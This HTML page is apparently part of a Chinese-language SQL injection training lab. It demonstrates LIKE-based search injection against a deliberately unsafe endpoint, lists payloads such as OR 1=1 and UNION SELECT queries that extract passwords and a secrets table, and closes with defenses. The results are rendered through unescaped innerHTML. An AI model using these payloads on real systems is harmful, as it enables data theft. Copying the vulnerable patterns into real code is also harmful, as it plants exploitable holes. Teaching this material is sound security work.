<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>å®éªŒä¸‰ï¼šæœç´¢æ³¨å…¥</title>
  <link rel="stylesheet" href="../xss/style.css">
</head>
<body>
  <div class="container">
    <nav class="nav">
      <a href="index.html">â† è¿”å› SQLæ³¨å…¥ Lab</a>
    </nav>

    <header>
      <h1>ğŸ” å®éªŒä¸‰ï¼šæœç´¢æ³¨å…¥</h1>
      <p class="subtitle">LIKE-based SQL Injection</p>
    </header>

    <section>
      <h2>ğŸ“– åŸç†è¯´æ˜</h2>
      <p>æœç´¢åŠŸèƒ½é€šå¸¸ä½¿ç”¨ LIKE è¯­å¥ï¼ŒåŒæ ·å­˜åœ¨æ³¨å…¥é£é™©ï¼š</p>
      <pre><code>-- åŸå§‹æŸ¥è¯¢
SELECT * FROM users WHERE username LIKE '%å…³é”®è¯%'

-- æ³¨å…¥å
SELECT * FROM users WHERE username LIKE '%' OR 1=1--%'
                                          â†‘
                                    è¿”å›æ‰€æœ‰ç”¨æˆ·ï¼</code></pre>
    </section>

    <section>
      <h2>ğŸ§ª æ¼æ´æ¼”ç¤º - ç”¨æˆ·æœç´¢</h2>
      
      <div style="margin: 1rem 0;">
        <label>æœç´¢ç”¨æˆ·:</label>
        <input type="text" id="keyword" placeholder="è¾“å…¥å…³é”®è¯">
        <button class="btn" onclick="searchUser()" style="margin-top: 0.5rem;">æœç´¢</button>
      </div>

      <div class="warning-box">
        <strong>ğŸ’¡ å°è¯•ä»¥ä¸‹ Payloadï¼š</strong>
        
        <p style="margin-top: 0.5rem;"><strong>è¿”å›æ‰€æœ‰ç”¨æˆ·:</strong></p>
        <p><code>' OR '1'='1</code></p>
        <p><code>' OR 1=1--</code></p>
        
        <p style="margin-top: 0.5rem;"><strong>UNION æ³¨å…¥çªƒå–å¯†ç :</strong></p>
        <p><code>' UNION SELECT id,password,role FROM users--</code></p>
        
        <p style="margin-top: 0.5rem;"><strong>çªƒå– secrets è¡¨:</strong></p>
        <p><code>' UNION SELECT id,content,level FROM secrets--</code></p>
      </div>

      <div style="margin-top: 1.5rem;">
        <h3>æ‰§è¡Œçš„ SQL:</h3>
        <pre><code id="sqlDisplay">ç­‰å¾…è¾“å…¥...</code></pre>
      </div>

      <div style="margin-top: 1rem;">
        <h3>æœç´¢ç»“æœ:</h3>
        <div id="result">
          <p style="color: #888;">ç­‰å¾…æœç´¢...</p>
        </div>
      </div>
    </section>

    <section>
      <h2>ğŸ¯ æ”»å‡»è¯¦è§£</h2>
      
      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">Payload: ' OR '1'='1</h3>
      <pre><code>SELECT * FROM users WHERE username LIKE '%' OR '1'='1%'
                                            â†‘
                                      æ°¸è¿œä¸ºçœŸ
                                      è¿”å›æ‰€æœ‰è®°å½•</code></pre>

      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">Payload: ' UNION SELECT...</h3>
      <pre><code>SELECT id, username, role FROM users WHERE username LIKE '%'
UNION SELECT id, password, role FROM users--%'
             â†‘
      çªƒå–å¯†ç å­—æ®µï¼</code></pre>

      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">é€šé…ç¬¦æ”»å‡»</h3>
      <pre><code>-- % åŒ¹é…ä»»æ„å­—ç¬¦
æœç´¢: %
ç»“æœ: è¿”å›æ‰€æœ‰ç”¨æˆ·

-- _ åŒ¹é…å•ä¸ªå­—ç¬¦
æœç´¢: ____  (4ä¸ªä¸‹åˆ’çº¿)
ç»“æœ: è¿”å›ç”¨æˆ·åä¸º4ä¸ªå­—ç¬¦çš„ç”¨æˆ· (å¦‚ test, lisi)</code></pre>
    </section>

    <section>
      <h2>ğŸ”¬ çœŸå®æ¡ˆä¾‹</h2>
      <div class="info-box">
        <p>æœç´¢æ³¨å…¥åœ¨å®é™…åº”ç”¨ä¸­éå¸¸å¸¸è§ï¼š</p>
        <ul style="margin: 0.5rem 0 0 1.5rem;">
          <li>ç”µå•†ç½‘ç«™å•†å“æœç´¢</li>
          <li>ç”¨æˆ·ç®¡ç†åå°</li>
          <li>æ—¥å¿—æŸ¥è¯¢ç³»ç»Ÿ</li>
          <li>å†…å®¹ç®¡ç†ç³»ç»Ÿ</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>ğŸ›¡ï¸ é˜²å¾¡è¦ç‚¹</h2>
      <ul style="margin-left: 1.5rem;">
        <li><strong>å‚æ•°åŒ–æŸ¥è¯¢</strong> - <code>WHERE username LIKE ?</code>ï¼Œå‚æ•°ä¸º <code>%keyword%</code></li>
        <li><strong>è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦</strong> - è½¬ä¹‰ <code>%</code> å’Œ <code>_</code></li>
        <li><strong>é™åˆ¶æœç´¢é•¿åº¦</strong> - é˜²æ­¢è¶…é•¿ payload</li>
        <li><strong>å…¨æ–‡æœç´¢</strong> - ä½¿ç”¨ä¸“é—¨çš„æœç´¢å¼•æ“å¦‚ Elasticsearch</li>
      </ul>
      
      <p style="margin-top: 1rem;">å®‰å…¨çš„å®ç°ï¼š</p>
      <pre><code>// âœ… å‚æ•°åŒ– + è½¬ä¹‰é€šé…ç¬¦
const safeKeyword = keyword.replace(/%/g, '\\%').replace(/_/g, '\\_')
const sql = 'SELECT * FROM users WHERE username LIKE ?'
db.prepare(sql).all(`%${safeKeyword}%`)</code></pre>
    </section>
  </div>

  <script>
    async function searchUser() {
      const keyword = document.getElementById('keyword').value
      
      const res = await fetch(`/api/sql/search/unsafe?keyword=${encodeURIComponent(keyword)}`)
      const data = await res.json()
      
      // æ˜¾ç¤º SQL
      document.getElementById('sqlDisplay').textContent = data.sql || ''
      
      // æ˜¾ç¤ºç»“æœ
      const resultEl = document.getElementById('result')
      if (data.success && data.users.length > 0) {
        resultEl.innerHTML = `
          <table style="width: 100%; border-collapse: collapse;">
            <thead>
              <tr><th>ID</th><th>ç”¨æˆ·å/å†…å®¹</th><th>è§’è‰²/çº§åˆ«</th></tr>
            </thead>
            <tbody>
              ${data.users.map(u => `
                <tr>
                  <td>${u.id}</td>
                  <td>${u.username}</td>
                  <td>${u.role}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
          <p style="color: #888; margin-top: 0.5rem;">å…± ${data.users.length} æ¡ç»“æœ</p>
        `
      } else if (data.success) {
        resultEl.innerHTML = '<p style="color: #888;">æ— ç»“æœ</p>'
      } else {
        resultEl.innerHTML = `<div class="warning-box">${data.message}</div>`
      }
    }

    // å®æ—¶æ›´æ–° SQL é¢„è§ˆ
    document.getElementById('keyword').addEventListener('input', function(e) {
      document.getElementById('sqlDisplay').textContent = 
        `SELECT id, username, role FROM users WHERE username LIKE '%${e.target.value}%'`
    })
  </script>

  <style>
    th, td {
      padding: 0.75rem;
      text-align: left;
      border-bottom: 1px solid #0f3460;
    }
    th { background: #0f3460; }
  </style>
</body>
</html>
